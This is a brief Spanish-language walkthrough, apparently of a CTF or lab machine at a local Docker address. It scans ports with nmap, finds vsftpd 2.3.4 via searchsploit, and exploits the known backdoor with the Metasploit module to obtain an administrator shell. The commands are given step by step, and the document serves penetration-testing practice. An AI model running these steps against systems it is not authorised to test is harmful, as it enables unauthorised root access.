Haremos un escaneo de la ip para ver que puertos están abiertos y que servicios tiene asociados a ellos.
```
sudo nmap -sV -sC --min-rate 7000 -p- -Pn 172.17.0.2 -oN escaneo
```
![alt text](image.png)

Una vez tenemos el resultado del escaneo de puertos abiertos y de servicios asociados, vamos a ver si tiene algun exploit en esta version.
```
searchsploit vsftpd 2.3.4
```
![alt text](image-1.png)

Podemos ver que el segundo exploit está añadido al framework de metasploit. Entonces los vamos a usar para explotarlo y generarnos una shell.
```
msfconsole -q
```
![alt text](image-2.png)
```
search vsftpd 2.3.4
```
![alt text](image-3.png)
```
use 0
```
![alt text](image-4.png)
```
set rhosts 172.17.0.2
```
![alt text](image-5.png)
```
exploit
```
![alt text](image-6.png)

Hemos podido ver que hemos accedido directamente como administrador.